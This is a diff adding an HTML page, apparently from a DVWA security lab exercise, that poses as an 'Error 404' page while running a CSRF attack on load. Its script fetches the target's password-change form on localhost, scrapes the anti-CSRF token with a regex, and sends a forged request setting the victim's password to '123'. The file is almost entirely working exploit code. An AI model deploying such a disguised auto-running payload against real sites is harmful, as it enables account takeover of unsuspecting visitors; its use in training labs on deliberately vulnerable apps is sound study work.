@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+
+<html lang="en">
+    <head>
+        <meta name="referrer" content="unsafe-url">
+        <title>CSRF High Level Demo</title>
+    </head>
+	<body onload="change_password()">
+
+        <h1>Error 404</h1>
+
+		<!-- https://infosecwriteups.com/how-to-exploit-csrf-in-dvwa-stackzero-bf1b6b557d85 -->
+
+	    <script>
+	        function change_password(){
+
+	            const request = new XMLHttpRequest();
+	            const url = "http://127.0.0.1/vulnerabilities/csrf/"
+	            request.open("GET", url);
+
+	            request.onreadystatechange = () => {
+
+		            if (request.readyState === request.DONE && request.status === 200){
+
+		                var response = request.responseText;
+
+		                // find token
+		                var user_token = /[a-f0-9]{32}/g.exec(response)[0]
+
+		                // send a malicious request
+		                var newpasswd = "123";
+		                var payload = "http://127.0.0.1/vulnerabilities/csrf/?password_new=" + newpasswd + "&password_conf=" + newpasswd + "&Change=Change&user_token=" + user_token;
+		                var second_request = new XMLHttpRequest();
+		                second_request.open("GET", payload);
+		                second_request.send()
+
+		            }
+	            };
+	            request.send()
+	        
+	    }
+		</script>
+	</body>
+</html> 
